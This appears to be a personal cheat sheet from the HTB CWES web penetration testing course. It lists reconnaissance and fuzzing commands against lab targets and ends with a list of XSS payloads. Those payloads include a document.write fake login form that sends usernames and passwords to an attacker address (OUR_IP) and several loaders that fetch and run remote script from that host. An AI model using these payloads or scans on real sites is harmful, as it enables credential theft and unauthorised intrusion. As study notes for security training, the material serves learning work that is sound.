# CWES
HTB CWES cheet sheet. This section describes the commands learned during the CWES, omitting the most basic commands and theoretical parts.

## Information Gathering
``` Bash
g4man@htb[/htb]$ whois facebook.com
```
``` Bash
g4man@htb[/htb]$ dig google.com
```
``` Bash
g4man@htb[/htb]$ dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
```
``` Bash
g4man@htb[/htb]$ dig axfr @nsztm1.digi.ninja zonetransfer.me
```
``` Bash
g4man@htb[/htb]$ gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```
``` Bash
g4man@htb[/htb]$ nikto -h inlanefreight.com -Tuning b
```
``` Bash
g4man@htb[/htb]$ python3 ReconSpider.py http://inlanefreight.com
```

## Web fuzzing

### Directory and file fuzzing
``` Bash
g4man@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://IP:PORT/FUZZ
g4man@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt -u http://94.237.57.1:42381/webfuzzing_hidden_path/flag/FUZZ.html
g4man@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
```

### Fuzzing parameters
``` Bash
g4man@htb[/htb]$ wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://IP:PORT/get.php?x=FUZZ"
g4man@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
```

### Subdomain fuzz
``` Bash
g4man@htb[/htb]$ gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
g4man@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
```

### Filtering fuzzing output
``` Bash
g4man@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v
g4man@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -mc all 
```

### API fuzzing
``` Bash
g4man@htb[/htb]$ git clone https://github.com/PandaSt0rm/webfuzz_api.git
g4man@htb[/htb]$ cd webfuzz_api
g4man@htb[/htb]$ pip3 install -r requirements.txt
g4man@htb[/htb]$ python3 api_fuzzer.py http://IP:PORT
```

## Javascript Deofuscation

To ofuscate js use: https://obfuscator.io  
To deofuscate js use: https://matthewfl.com/unPacker.html

## Cross-site scripting XSS

Payloads used during the training 
``` 
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
<script src="http://OUR_IP/script.js"></script>
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Automatic too;
``` bash
g4man@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```